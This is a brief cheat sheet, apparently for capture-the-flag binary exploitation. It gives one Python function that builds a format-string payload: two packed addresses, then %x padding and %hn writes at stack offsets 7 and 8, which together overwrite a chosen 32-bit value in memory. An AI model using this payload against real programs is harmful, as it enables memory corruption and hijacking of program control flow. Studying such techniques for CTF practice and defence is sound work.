# pwn-cheat-sheet

### Format string - write value into address
```python
def write_memory(address, value):
  v1 = (value & 0x0000FFFF) - 8
  v2 = (value >> 16) - (value & 0x0000FFFF)

  if v2 < 0:
    v2 += 0x00010000

  ret = p32(address) + p32(address + 2) + '%{}x'.format(v1) + '%7$hn'

  if v2 != 0:
    ret += '%{}x'.format(v2)

  ret += '%8$hn'

  return ret
  ```
